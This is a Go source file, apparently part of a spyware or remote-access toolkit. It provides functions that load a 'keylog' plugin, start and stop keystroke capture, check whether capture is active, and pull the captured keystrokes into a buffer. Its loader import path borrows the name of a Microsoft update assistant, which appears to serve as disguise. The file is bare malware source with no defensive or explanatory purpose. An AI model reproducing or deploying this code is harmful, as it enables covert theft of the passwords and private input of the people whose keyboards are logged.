package sysutil

import (
	"sync"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/loader"
)

var (
	keylogPlugin *loader.Plugin
	keylogMu     sync.Mutex
)

func keylogEnsureLoaded() bool {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	if keylogPlugin != nil {
		return true
	}
	p, err := loader.Load("keylog")
	if err != nil {
		return false
	}
	keylogPlugin = p
	return true
}

func keylogUnload() {
	keylogMu.Lock()
	defer keylogMu.Unlock()
	if keylogPlugin != nil {
		loader.Unload(keylogPlugin)
		keylogPlugin = nil
	}
}

func KeylogStart() bool {
	if !keylogEnsureLoaded() {
		return false
	}
	keylogMu.Lock()
	p := keylogPlugin
	keylogMu.Unlock()
	if p == nil {
		return false
	}
	n, _ := p.Call("keylog_start")
	return int(n) == 1
}

func KeylogStop() bool {
	keylogMu.Lock()
	p := keylogPlugin
	keylogMu.Unlock()
	if p == nil {
		return false
	}
	n, _ := p.Call("keylog_stop")
	keylogUnload()
	return int(n) == 1
}

func KeylogGet() string {
	keylogMu.Lock()
	p := keylogPlugin
	keylogMu.Unlock()
	if p == nil {
		return ""
	}
	buf := make([]byte, 65536)
	n, _ := p.Call("keylog_get", uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
	if int(n) > 0 {
		return string(buf[:int(n)])
	}
	return ""
}

func KeylogActive() bool {
	keylogMu.Lock()
	p := keylogPlugin
	keylogMu.Unlock()
	if p == nil {
		return false
	}
	n, _ := p.Call("keylog_active")
	return int(n) == 1
}
